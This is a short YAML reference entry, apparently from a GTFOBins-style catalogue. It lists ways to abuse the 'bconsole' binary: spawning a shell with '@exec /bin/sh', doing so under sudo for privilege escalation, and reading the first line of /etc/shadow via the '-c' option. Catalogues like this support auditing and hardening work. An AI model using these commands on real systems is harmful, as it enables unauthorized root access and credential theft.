---
functions:
  shell:
    - description: The @exec function allows you to execute commands in the local tty
      code: |
        bconsole
        @exec /bin/sh
  sudo:
    - description: The @exec function allows you to execute commands in the local tty
      code: |
        sudo bconsole
        @exec /bin/sh
  file-read:
    - description: The error message of the -c options displays the first line of a restricted file, when having sudo rights for the binary.
      code: sudo bconsole -c /etc/shadow
---
